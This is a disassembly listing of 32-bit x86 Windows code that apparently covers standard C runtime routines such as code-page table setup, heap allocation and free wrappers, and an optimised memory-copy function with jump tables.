  4241a9:	add    esp,0x5c
  4241ac:	xor    eax,eax
  4241ae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241b6:	test   cl,0x1
  4241b9:	je     0x4241d1
  4241bb:	or     BYTE PTR [eax+0x460001],0x10
  4241c2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241c9:	mov    BYTE PTR [eax+0x460120],cl
  4241cf:	jmp    0x4241ed
  4241d1:	test   cl,0x2
  4241d4:	je     0x4241e6
  4241d6:	or     BYTE PTR [eax+0x460001],0x20
  4241dd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241e4:	jmp    0x4241c9
  4241e6:	and    BYTE PTR [eax+0x460120],0x0
  4241ed:	inc    eax
  4241ee:	cmp    eax,esi
  4241f0:	jb     0x4241ae
  4241f2:	jmp    0x424238
  4241f4:	xor    eax,eax
  4241f6:	cmp    eax,0x41
  4241f9:	jb     0x424214
  4241fb:	cmp    eax,0x5a
  4241fe:	ja     0x424214
  424200:	or     BYTE PTR [eax+0x460001],0x10
  424207:	mov    cl,al
  424209:	add    cl,0x20
  42420c:	mov    BYTE PTR [eax+0x460120],cl
  424212:	jmp    0x424233
  424214:	cmp    eax,0x61
  424217:	jb     0x42422c
  424219:	cmp    eax,0x7a
  42421c:	ja     0x42422c
  42421e:	or     BYTE PTR [eax+0x460001],0x20
  424225:	mov    cl,al
  424227:	sub    cl,0x20
  42422a:	jmp    0x42420c
  42422c:	and    BYTE PTR [eax+0x460120],0x0
  424233:	inc    eax
  424234:	cmp    eax,esi
  424236:	jb     0x4241f6
  424238:	mov    ecx,DWORD PTR [ebp-0x4]
  42423b:	xor    ecx,DWORD PTR [ebp+0x4]
  42423e:	pop    esi
  42423f:	call   0x42400c
  424244:	leave  
  424245:	ret    
  424246:	push   ebp
  424247:	mov    ebp,esp
  424249:	sub    esp,0x1c
  42424c:	mov    eax,ds:0x45f510
  424251:	xor    eax,DWORD PTR [ebp+0x4]
  424254:	push   ebx
  424255:	push   esi
  424256:	mov    esi,DWORD PTR [ebp+0x8]
  424259:	xor    ebx,ebx
  42425b:	cmp    esi,ebx
  42425d:	mov    DWORD PTR [ebp-0x4],eax
  424260:	push   edi
  424261:	je     0x4243bb
  424267:	xor    edx,edx
  424269:	xor    eax,eax
  42426b:	cmp    DWORD PTR [eax+0x45f520],esi
  424271:	je     0x4242d8
  424273:	add    eax,0x30
  424276:	inc    edx
  424277:	cmp    eax,0xf0
  42427c:	jb     0x42426b
  42427e:	lea    eax,[ebp-0x1c]
  424281:	push   eax
  424282:	push   esi
  424283:	call   DWORD PTR ds:0x4280d4
  424289:	cmp    eax,0x1
  42428c:	jne    0x4243b3
  424292:	push   0x40
  424294:	xor    eax,eax
  424296:	cmp    DWORD PTR [ebp-0x1c],0x1
  42429a:	pop    ecx
  42429b:	mov    edi,0x460000
  4242a0:	rep stos DWORD PTR es:[edi],eax
  4242a2:	stos   BYTE PTR es:[edi],al
  4242a3:	mov    DWORD PTR ds:0x460104,esi
  4242a9:	mov    DWORD PTR ds:0x45fff4,ebx
  4242af:	jbe    0x4243a1
  4242b5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242b9:	je     0x424379
  4242bf:	lea    ecx,[ebp-0x15]
  4242c2:	mov    dl,BYTE PTR [ecx]
  4242c4:	test   dl,dl
  4242c6:	je     0x424379
  4242cc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242d0:	movzx  edx,dl
  4242d3:	jmp    0x424369
  4242d8:	push   0x40
  4242da:	xor    eax,eax
  4242dc:	pop    ecx
  4242dd:	mov    edi,0x460000
  4242e2:	rep stos DWORD PTR es:[edi],eax
  4242e4:	lea    ecx,[edx+edx*2]
  4242e7:	shl    ecx,0x4
  4242ea:	mov    DWORD PTR [ebp-0x8],ebx
  4242ed:	stos   BYTE PTR es:[edi],al
  4242ee:	lea    ebx,[ecx+0x45f530]
  4242f4:	mov    al,BYTE PTR [ebx]
  4242f6:	mov    esi,ebx
  4242f8:	jmp    0x424323
  4242fa:	mov    dl,BYTE PTR [esi+0x1]
  4242fd:	test   dl,dl
  4242ff:	je     0x424327
  424301:	movzx  eax,al
  424304:	movzx  edi,dl
  424307:	cmp    eax,edi
  424309:	ja     0x42431f
  42430b:	mov    edx,DWORD PTR [ebp-0x8]
  42430e:	mov    dl,BYTE PTR [edx+0x45f518]
  424314:	or     BYTE PTR [eax+0x460001],dl
  42431a:	inc    eax
  42431b:	cmp    eax,edi
  42431d:	jbe    0x424314
  42431f:	inc    esi
  424320:	inc    esi
  424321:	mov    al,BYTE PTR [esi]
  424323:	test   al,al
  424325:	jne    0x4242fa
  424327:	inc    DWORD PTR [ebp-0x8]
  42432a:	add    ebx,0x8
  42432d:	cmp    DWORD PTR [ebp-0x8],0x4
  424331:	jb     0x4242f4
  424333:	mov    eax,DWORD PTR [ebp+0x8]
  424336:	mov    ds:0x460104,eax
  42433b:	mov    DWORD PTR ds:0x45fffc,0x1
  424345:	call   0x42405c
  42434a:	lea    ecx,[ecx+0x45f524]
  424350:	mov    esi,ecx
  424352:	mov    edi,0x460110
  424357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424359:	mov    ds:0x45fff4,eax
  42435e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42435f:	jmp    0x4243c0
  424361:	or     BYTE PTR [eax+0x460001],0x4
  424368:	inc    eax
  424369:	cmp    eax,edx
  42436b:	jbe    0x424361
  42436d:	inc    ecx
  42436e:	inc    ecx
  42436f:	cmp    BYTE PTR [ecx-0x1],0x0
  424373:	jne    0x4242c2
  424379:	xor    ecx,ecx
  42437b:	inc    ecx
  42437c:	mov    eax,ecx
  42437e:	or     BYTE PTR [eax+0x460001],0x8
  424385:	inc    eax
  424386:	cmp    eax,0xff
  42438b:	jb     0x42437e
  42438d:	mov    eax,esi
  42438f:	call   0x42405c
  424394:	mov    ds:0x45fff4,eax
  424399:	mov    DWORD PTR ds:0x45fffc,ecx
  42439f:	jmp    0x4243a7
  4243a1:	mov    DWORD PTR ds:0x45fffc,ebx
  4243a7:	xor    eax,eax
  4243a9:	mov    edi,0x460110
  4243ae:	stos   DWORD PTR es:[edi],eax
  4243af:	stos   DWORD PTR es:[edi],eax
  4243b0:	stos   DWORD PTR es:[edi],eax
  4243b1:	jmp    0x4243c0
  4243b3:	cmp    DWORD PTR ds:0x45fe64,ebx
  4243b9:	je     0x4243c9
  4243bb:	call   0x42408b
  4243c0:	call   0x4240b4
  4243c5:	xor    eax,eax
  4243c7:	jmp    0x4243cc
  4243c9:	or     eax,0xffffffff
  4243cc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243cf:	xor    ecx,DWORD PTR [ebp+0x4]
  4243d2:	pop    edi
  4243d3:	pop    esi
  4243d4:	pop    ebx
  4243d5:	call   0x42400c
  4243da:	leave  
  4243db:	ret    
  4243dc:	push   0x14
  4243de:	push   0x428590
  4243e3:	call   0x423940
  4243e8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243ec:	push   0xd
  4243ee:	call   0x423aff
  4243f3:	pop    ecx
  4243f4:	xor    edi,edi
  4243f6:	mov    DWORD PTR [ebp-0x4],edi
  4243f9:	mov    DWORD PTR ds:0x45fe64,edi
  4243ff:	mov    eax,DWORD PTR [ebp+0x8]
  424402:	cmp    eax,0xfffffffe
  424405:	jne    0x424419
  424407:	mov    DWORD PTR ds:0x45fe64,0x1
  424411:	call   DWORD PTR ds:0x4280d0
  424417:	jmp    0x424444
  424419:	cmp    eax,0xfffffffd
  42441c:	jne    0x424430
  42441e:	mov    DWORD PTR ds:0x45fe64,0x1
  424428:	call   DWORD PTR ds:0x4280cc
  42442e:	jmp    0x424444
  424430:	cmp    eax,0xfffffffc
  424433:	jne    0x424444
  424435:	mov    DWORD PTR ds:0x45fe64,0x1
  42443f:	mov    eax,ds:0x45fe94
  424444:	mov    DWORD PTR [ebp+0x8],eax
  424447:	cmp    eax,DWORD PTR ds:0x460104
  42444d:	je     0x42450e
  424453:	mov    esi,DWORD PTR ds:0x45fff8
  424459:	mov    DWORD PTR [ebp-0x20],esi
  42445c:	cmp    esi,edi
  42445e:	je     0x424464
  424460:	cmp    DWORD PTR [esi],edi
  424462:	je     0x424474
  424464:	push   0x220
  424469:	call   0x424662
  42446e:	pop    ecx
  42446f:	mov    esi,eax
  424471:	mov    DWORD PTR [ebp-0x20],esi
  424474:	cmp    esi,edi
  424476:	je     0x4244f7
  424478:	push   DWORD PTR [ebp+0x8]
  42447b:	call   0x424246
  424480:	pop    ecx
  424481:	mov    DWORD PTR [ebp-0x1c],eax
  424484:	cmp    eax,edi
  424486:	jne    0x4244f7
  424488:	mov    DWORD PTR [esi],edi
  42448a:	mov    eax,ds:0x460104
  42448f:	mov    DWORD PTR [esi+0x4],eax
  424492:	mov    eax,ds:0x45fffc
  424497:	mov    DWORD PTR [esi+0x8],eax
  42449a:	mov    eax,ds:0x45fff4
  42449f:	mov    DWORD PTR [esi+0xc],eax
  4244a2:	xor    eax,eax
  4244a4:	mov    DWORD PTR [ebp-0x24],eax
  4244a7:	cmp    eax,0x5
  4244aa:	jge    0x4244bc
  4244ac:	mov    cx,WORD PTR [eax*2+0x460110]
  4244b4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244b9:	inc    eax
  4244ba:	jmp    0x4244a4
  4244bc:	xor    eax,eax
  4244be:	mov    DWORD PTR [ebp-0x24],eax
  4244c1:	cmp    eax,0x101
  4244c6:	jge    0x4244d5
  4244c8:	mov    cl,BYTE PTR [eax+0x460000]
  4244ce:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244d2:	inc    eax
  4244d3:	jmp    0x4244be
  4244d5:	xor    eax,eax
  4244d7:	mov    DWORD PTR [ebp-0x24],eax
  4244da:	cmp    eax,0x100
  4244df:	jge    0x4244f1
  4244e1:	mov    cl,BYTE PTR [eax+0x460120]
  4244e7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244ee:	inc    eax
  4244ef:	jmp    0x4244d7
  4244f1:	mov    DWORD PTR ds:0x45fff8,esi
  4244f7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4244fb:	jne    0x424511
  4244fd:	cmp    esi,DWORD PTR ds:0x45fff8
  424503:	je     0x424511
  424505:	push   esi
  424506:	call   0x42454a
  42450b:	pop    ecx
  42450c:	jmp    0x424511
  42450e:	mov    DWORD PTR [ebp-0x1c],edi
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x424523
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	call   0x42397b
  424522:	ret    
  424523:	push   0xd
  424525:	call   0x423a6b
  42452a:	pop    ecx
  42452b:	ret    
  42452c:	cmp    DWORD PTR ds:0x46034c,0x0
  424533:	jne    0x424547
  424535:	push   0xfffffffd
  424537:	call   0x4243dc
  42453c:	pop    ecx
  42453d:	mov    DWORD PTR ds:0x46034c,0x1
  424547:	xor    eax,eax
  424549:	ret    
  42454a:	push   0xc
  42454c:	push   0x4285a0
  424551:	call   0x423940
  424556:	mov    esi,DWORD PTR [ebp+0x8]
  424559:	test   esi,esi
  42455b:	je     0x4245b5
  42455d:	cmp    DWORD PTR ds:0x460224,0x3
  424564:	jne    0x4245a6
  424566:	push   0x4
  424568:	call   0x423aff
  42456d:	pop    ecx
  42456e:	and    DWORD PTR [ebp-0x4],0x0
  424572:	push   esi
  424573:	call   0x424d22
  424578:	pop    ecx
  424579:	mov    DWORD PTR [ebp-0x1c],eax
  42457c:	test   eax,eax
  42457e:	je     0x424589
  424580:	push   esi
  424581:	push   eax
  424582:	call   0x424d4d
  424587:	pop    ecx
  424588:	pop    ecx
  424589:	or     DWORD PTR [ebp-0x4],0xffffffff
  42458d:	call   0x42459d
  424592:	cmp    DWORD PTR [ebp-0x1c],0x0
  424596:	jne    0x4245b5
  424598:	push   DWORD PTR [ebp+0x8]
  42459b:	jmp    0x4245a7
  42459d:	push   0x4
  42459f:	call   0x423a6b
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	push   esi
  4245a7:	push   0x0
  4245a9:	push   DWORD PTR ds:0x460220
  4245af:	call   DWORD PTR ds:0x4280c0
  4245b5:	call   0x42397b
  4245ba:	ret    
  4245bb:	push   0xc
  4245bd:	push   0x4285b0
  4245c2:	call   0x423940
  4245c7:	mov    esi,DWORD PTR [ebp+0x8]
  4245ca:	cmp    DWORD PTR ds:0x460224,0x3
  4245d1:	jne    0x424601
  4245d3:	cmp    esi,DWORD PTR ds:0x45ffe4
  4245d9:	ja     0x424601
  4245db:	push   0x4
  4245dd:	call   0x423aff
  4245e2:	pop    ecx
  4245e3:	and    DWORD PTR [ebp-0x4],0x0
  4245e7:	push   esi
  4245e8:	call   0x425501
  4245ed:	pop    ecx
  4245ee:	mov    DWORD PTR [ebp-0x1c],eax
  4245f1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4245f5:	call   0x42462d
  4245fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4245fd:	test   eax,eax
  4245ff:	jne    0x424624
  424601:	test   esi,esi
  424603:	jne    0x424606
  424605:	inc    esi
  424606:	cmp    DWORD PTR ds:0x460224,0x1
  42460d:	je     0x424615
  42460f:	add    esi,0xf
  424612:	and    esi,0xfffffff0
  424615:	push   esi
  424616:	push   0x0
  424618:	push   DWORD PTR ds:0x460220
  42461e:	call   DWORD PTR ds:0x4280d8
  424624:	call   0x42397b
  424629:	ret    
  42462a:	mov    esi,DWORD PTR [ebp+0x8]
  42462d:	push   0x4
  42462f:	call   0x423a6b
  424634:	pop    ecx
  424635:	ret    
  424636:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42463b:	ja     0x42465f
  42463d:	push   DWORD PTR [esp+0x4]
  424641:	call   0x4245bb
  424646:	test   eax,eax
  424648:	pop    ecx
  424649:	jne    0x424661
  42464b:	cmp    DWORD PTR [esp+0x8],eax
  42464f:	je     0x424661
  424651:	push   DWORD PTR [esp+0x4]
  424655:	call   0x426222
  42465a:	test   eax,eax
  42465c:	pop    ecx
  42465d:	jne    0x42463d
  42465f:	xor    eax,eax
  424661:	ret    
  424662:	push   DWORD PTR ds:0x45fea8
  424668:	push   DWORD PTR [esp+0x8]
  42466c:	call   0x424636
  424671:	pop    ecx
  424672:	pop    ecx
  424673:	ret    
  424674:	int3   
  424675:	int3   
  424676:	int3   
  424677:	int3   
  424678:	int3   
  424679:	int3   
  42467a:	int3   
  42467b:	int3   
  42467c:	int3   
  42467d:	int3   
  42467e:	int3   
  42467f:	int3   
  424680:	push   ebp
  424681:	mov    ebp,esp
  424683:	push   edi
  424684:	push   esi
  424685:	mov    esi,DWORD PTR [ebp+0xc]
  424688:	mov    ecx,DWORD PTR [ebp+0x10]
  42468b:	mov    edi,DWORD PTR [ebp+0x8]
  42468e:	mov    eax,ecx
  424690:	mov    edx,ecx
  424692:	add    eax,esi
  424694:	cmp    edi,esi
  424696:	jbe    0x4246a0
  424698:	cmp    edi,eax
  42469a:	jb     0x42481c
  4246a0:	test   edi,0x3
  4246a6:	jne    0x4246bc
  4246a8:	shr    ecx,0x2
  4246ab:	and    edx,0x3
  4246ae:	cmp    ecx,0x8
  4246b1:	jb     0x4246dc
  4246b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246b5:	jmp    DWORD PTR [edx*4+0x4247cc]
  4246bc:	mov    eax,edi
  4246be:	mov    edx,0x3
  4246c3:	sub    ecx,0x4
  4246c6:	jb     0x4246d4
  4246c8:	and    eax,0x3
  4246cb:	add    ecx,eax
  4246cd:	jmp    DWORD PTR [eax*4+0x4246e0]
  4246d4:	jmp    DWORD PTR [ecx*4+0x4247dc]
  4246db:	nop
  4246dc:	jmp    DWORD PTR [ecx*4+0x424760]
  4246e3:	nop
  4246e4:	lock inc esi
  4246e6:	inc    edx
  4246e7:	add    BYTE PTR [edi+eax*2],bl
  4246ea:	inc    edx
  4246eb:	add    BYTE PTR [eax+0x47],al
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx],ah
  4246f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4246f7:	inc    esi
  4246f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4246fe:	add    al,cl
  424700:	jmp    0x289cf07
  424705:	add    esi,0x3
  424708:	add    edi,0x3
  42470b:	cmp    ecx,0x8
  42470e:	jb     0x4246dc
  424710:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424712:	jmp    DWORD PTR [edx*4+0x4247cc]
  424719:	lea    ecx,[ecx+0x0]
  42471c:	and    edx,ecx
  42471e:	mov    al,BYTE PTR [esi]
  424720:	mov    BYTE PTR [edi],al
  424722:	mov    al,BYTE PTR [esi+0x1]
  424725:	shr    ecx,0x2
  424728:	mov    BYTE PTR [edi+0x1],al
  42472b:	add    esi,0x2
  42472e:	add    edi,0x2
  424731:	cmp    ecx,0x8
  424734:	jb     0x4246dc
  424736:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424738:	jmp    DWORD PTR [edx*4+0x4247cc]
  42473f:	nop
  424740:	and    edx,ecx
  424742:	mov    al,BYTE PTR [esi]
  424744:	mov    BYTE PTR [edi],al
  424746:	add    esi,0x1
  424749:	shr    ecx,0x2
  42474c:	add    edi,0x1
  42474f:	cmp    ecx,0x8
  424752:	jb     0x4246dc
  424754:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424756:	jmp    DWORD PTR [edx*4+0x4247cc]
  42475d:	lea    ecx,[ecx+0x0]
  424760:	ret    
  424761:	inc    edi
  424762:	inc    edx
  424763:	add    BYTE PTR [eax-0x57ffbdb9],dh
  424769:	inc    edi
  42476a:	inc    edx
  42476b:	add    BYTE PTR [eax-0x67ffbdb9],ah
  424771:	inc    edi
  424772:	inc    edx
  424773:	add    BYTE PTR [eax-0x77ffbdb9],dl
  424779:	inc    edi
  42477a:	inc    edx
  42477b:	add    BYTE PTR [eax-0x74ffbdb9],al
  424781:	inc    esp
  424782:	mov    fs,esp
  424784:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  424788:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42478c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424790:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424794:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424798:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42479c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4247a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4247ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4247b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247b8:	lea    eax,[ecx*4+0x0]
  4247bf:	add    esi,eax
  4247c1:	add    edi,eax
  4247c3:	jmp    DWORD PTR [edx*4+0x4247cc]
  4247ca:	mov    edi,edi
  4247cc:	fadd   QWORD PTR [edi+0x42]
  4247cf:	add    ah,ah
  4247d1:	inc    edi
  4247d2:	inc    edx
  4247d3:	add    al,dh
  4247d5:	inc    edi
  4247d6:	inc    edx
  4247d7:	add    BYTE PTR [eax+ecx*2],al
  4247da:	inc    edx
  4247db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247e1:	leave  
  4247e2:	ret    
  4247e3:	nop
  4247e4:	mov    al,BYTE PTR [esi]
  4247e6:	mov    BYTE PTR [edi],al
  4247e8:	mov    eax,DWORD PTR [ebp+0x8]
  4247eb:	pop    esi
  4247ec:	pop    edi
  4247ed:	leave  
  4247ee:	ret    
  4247ef:	nop
  4247f0:	mov    al,BYTE PTR [esi]
  4247f2:	mov    BYTE PTR [edi],al
  4247f4:	mov    al,BYTE PTR [esi+0x1]
  4247f7:	mov    BYTE PTR [edi+0x1],al
  4247fa:	mov    eax,DWORD PTR [ebp+0x8]
  4247fd:	pop    esi
  4247fe:	pop    edi
  4247ff:	leave  
  424800:	ret    
  424801:	lea    ecx,[ecx+0x0]
  424804:	mov    al,BYTE PTR [esi]
  424806:	mov    BYTE PTR [edi],al
  424808:	mov    al,BYTE PTR [esi+0x1]
  42480b:	mov    BYTE PTR [edi+0x1],al
  42480e:	mov    al,BYTE PTR [esi+0x2]
  424811:	mov    BYTE PTR [edi+0x2],al
  424814:	mov    eax,DWORD PTR [ebp+0x8]
  424817:	pop    esi
  424818:	pop    edi
  424819:	leave  
  42481a:	ret    
  42481b:	nop
  42481c:	lea    esi,[ecx+esi*1-0x4]
  424820:	lea    edi,[ecx+edi*1-0x4]
  424824:	test   edi,0x3
  42482a:	jne    0x424850
  42482c:	shr    ecx,0x2
  42482f:	and    edx,0x3
  424832:	cmp    ecx,0x8
  424835:	jb     0x424844
  424837:	std    
  424838:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42483a:	cld    
  42483b:	jmp    DWORD PTR [edx*4+0x424968]
  424842:	mov    edi,edi
  424844:	neg    ecx
  424846:	jmp    DWORD PTR [ecx*4+0x424918]
  42484d:	lea    ecx,[ecx+0x0]
  424850:	mov    eax,edi
  424852:	mov    edx,0x3
  424857:	cmp    ecx,0x4
  42485a:	jb     0x424868
  42485c:	and    eax,0x3
  42485f:	sub    ecx,eax
  424861:	jmp    DWORD PTR [eax*4+0x42486c]
  424868:	jmp    DWORD PTR [ecx*4+0x424968]
  42486f:	nop
  424870:	jl     0x4248ba
  424872:	inc    edx
  424873:	add    BYTE PTR [eax-0x37ffbdb8],ah
  424879:	dec    eax
  42487a:	inc    edx
  42487b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424881:	mov    BYTE PTR [edi+0x3],al
  424884:	sub    esi,0x1
  424887:	shr    ecx,0x2
  42488a:	sub    edi,0x1
  42488d:	cmp    ecx,0x8
  424890:	jb     0x424844
  424892:	std    
  424893:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424895:	cld    
  424896:	jmp    DWORD PTR [edx*4+0x424968]
  42489d:	lea    ecx,[ecx+0x0]
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	and    edx,ecx
  4248a5:	mov    BYTE PTR [edi+0x3],al
  4248a8:	mov    al,BYTE PTR [esi+0x2]
  4248ab:	shr    ecx,0x2
  4248ae:	mov    BYTE PTR [edi+0x2],al
  4248b1:	sub    esi,0x2
  4248b4:	sub    edi,0x2
  4248b7:	cmp    ecx,0x8
  4248ba:	jb     0x424844
  4248bc:	std    
  4248bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248bf:	cld    
  4248c0:	jmp    DWORD PTR [edx*4+0x424968]
  4248c7:	nop
  4248c8:	mov    al,BYTE PTR [esi+0x3]
  4248cb:	and    edx,ecx
  4248cd:	mov    BYTE PTR [edi+0x3],al
  4248d0:	mov    al,BYTE PTR [esi+0x2]
  4248d3:	mov    BYTE PTR [edi+0x2],al
  4248d6:	mov    al,BYTE PTR [esi+0x1]
  4248d9:	shr    ecx,0x2
  4248dc:	mov    BYTE PTR [edi+0x1],al
  4248df:	sub    esi,0x3
  4248e2:	sub    edi,0x3
  4248e5:	cmp    ecx,0x8
  4248e8:	jb     0x424844
  4248ee:	std    
  4248ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248f1:	cld    
  4248f2:	jmp    DWORD PTR [edx*4+0x424968]
  4248f9:	lea    ecx,[ecx+0x0]
  4248fc:	sbb    al,0x49
  4248fe:	inc    edx
  4248ff:	add    BYTE PTR [ecx+ecx*2],ah
  424902:	inc    edx
  424903:	add    BYTE PTR [ecx+ecx*2],ch
  424906:	inc    edx
  424907:	add    BYTE PTR [ecx+ecx*2],dh
  42490a:	inc    edx
  42490b:	add    BYTE PTR [ecx+ecx*2],bh
  42490e:	inc    edx
  42490f:	add    BYTE PTR [ecx+ecx*2+0x42],al
  424913:	add    BYTE PTR [ecx+ecx*2+0x42],cl
  424917:	add    BYTE PTR [edi+0x49],bl
  42491a:	inc    edx
  42491b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424921:	inc    esp
  424922:	(bad)  
  424923:	sbb    al,0x8b
  424925:	inc    esp
  424926:	mov    ds,WORD PTR [eax]
  424928:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42492c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424930:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424934:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424938:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424940:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424944:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424948:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42494c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424950:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424954:	lea    eax,[ecx*4+0x0]
  42495b:	add    esi,eax
  42495d:	add    edi,eax
  42495f:	jmp    DWORD PTR [edx*4+0x424968]
  424966:	mov    edi,edi
  424968:	js     0x4249b3
  42496a:	inc    edx
  42496b:	add    BYTE PTR [eax-0x6fffbdb7],al
  424971:	dec    ecx
  424972:	inc    edx
  424973:	add    BYTE PTR [ecx+ecx*2+0x458b0042],ah
  42497a:	or     BYTE PTR [esi+0x5f],bl
  42497d:	leave  
  42497e:	ret    
  42497f:	nop
  424980:	mov    al,BYTE PTR [esi+0x3]
  424983:	mov    BYTE PTR [edi+0x3],al
  424986:	mov    eax,DWORD PTR [ebp+0x8]
  424989:	pop    esi
  42498a:	pop    edi
  42498b:	leave  
  42498c:	ret    
  42498d:	lea    ecx,[ecx+0x0]
  424990:	mov    al,BYTE PTR [esi+0x3]
  424993:	mov    BYTE PTR [edi+0x3],al
  424996:	mov    al,BYTE PTR [esi+0x2]
  424999:	mov    BYTE PTR [edi+0x2],al
  42499c:	mov    eax,DWORD PTR [ebp+0x8]
  42499f:	pop    esi
  4249a0:	pop    edi
  4249a1:	leave  
  4249a2:	ret    
  4249a3:	nop
  4249a4:	mov    al,BYTE PTR [esi+0x3]
  4249a7:	mov    BYTE PTR [edi+0x3],al
  4249aa:	mov    al,BYTE PTR [esi+0x2]
  4249ad:	mov    BYTE PTR [edi+0x2],al
  4249b0:	mov    al,BYTE PTR [esi+0x1]
  4249b3:	mov    BYTE PTR [edi+0x1],al
  4249b6:	mov    eax,DWORD PTR [ebp+0x8]
  4249b9:	pop    esi
  4249ba:	pop    edi
  4249bb:	leave  
  4249bc:	ret    
  4249bd:	push   DWORD PTR [esp+0x4]
  4249c1:	call   DWORD PTR ds:0x4280dc
  4249c7:	xor    eax,eax
  4249c9:	inc    eax
  4249ca:	ret    0x8
  4249cd:	push   0x10
  4249cf:	push   0x4285f8
  4249d4:	call   0x423940
  4249d9:	mov    eax,ds:0x45fe68
  4249de:	test   eax,eax
  4249e0:	jne    0x424a19
  4249e2:	cmp    DWORD PTR ds:0x45fba4,0x1
  4249e9:	je     0x424a0f
  4249eb:	push   0x4285e4
  4249f0:	call   DWORD PTR ds:0x428014
  4249f6:	test   eax,eax
  4249f8:	je     0x424a0f
  4249fa:	push   0x4285bc
  4249ff:	push   eax
  424a00:	call   DWORD PTR ds:0x428010
  424a06:	mov    ds:0x45fe68,eax
  424a0b:	test   eax,eax
  424a0d:	jne    0x424a19
  424a0f:	mov    eax,0x4249bd
  424a14:	mov    ds:0x45fe68,eax
  424a19:	and    DWORD PTR [ebp-0x4],0x0
  424a1d:	push   DWORD PTR [ebp+0xc]
  424a20:	push   DWORD PTR [ebp+0x8]
  424a23:	call   eax
  424a25:	mov    DWORD PTR [ebp-0x1c],eax
  424a28:	jmp    0x424a4e
  424a2a:	mov    eax,DWORD PTR [ebp-0x14]
  424a2d:	mov    eax,DWORD PTR [eax]
  424a2f:	mov    eax,DWORD PTR [eax]
  424a31:	mov    DWORD PTR [ebp-0x20],eax
  424a34:	xor    eax,eax
  424a36:	inc    eax
  424a37:	ret    
  424a38:	mov    esp,DWORD PTR [ebp-0x18]
  424a3b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a42:	jne    0x424a4c
  424a44:	push   0x8
  424a46:	call   DWORD PTR ds:0x4280a0
  424a4c:	xor    eax,eax
  424a4e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a52:	call   0x42397b
  424a57:	ret    
  424a58:	push   0x10
  424a5a:	push   0x428608
  424a5f:	call   0x423940
  424a64:	mov    esi,DWORD PTR [ebp+0x8]
  424a67:	imul   esi,DWORD PTR [ebp+0xc]
  424a6b:	mov    DWORD PTR [ebp-0x1c],esi
  424a6e:	test   esi,esi
  424a70:	jne    0x424a73
  424a72:	inc    esi
  424a73:	xor    edi,edi
  424a75:	mov    DWORD PTR [ebp-0x20],edi
  424a78:	cmp    esi,0xffffffe0
  424a7b:	ja     0x424ae2
  424a7d:	cmp    DWORD PTR ds:0x460224,0x3
  424a84:	jne    0x424acd
  424a86:	add    esi,0xf
  424a89:	and    esi,0xfffffff0
  424a8c:	mov    DWORD PTR [ebp+0xc],esi
  424a8f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a92:	cmp    ebx,DWORD PTR ds:0x45ffe4
  424a98:	ja     0x424acd
  424a9a:	push   0x4
  424a9c:	call   0x423aff
  424aa1:	pop    ecx
  424aa2:	and    DWORD PTR [ebp-0x4],edi
  424aa5:	push   ebx
  424aa6:	call   0x425501
  424aab:	pop    ecx
  424aac:	mov    DWORD PTR [ebp-0x20],eax
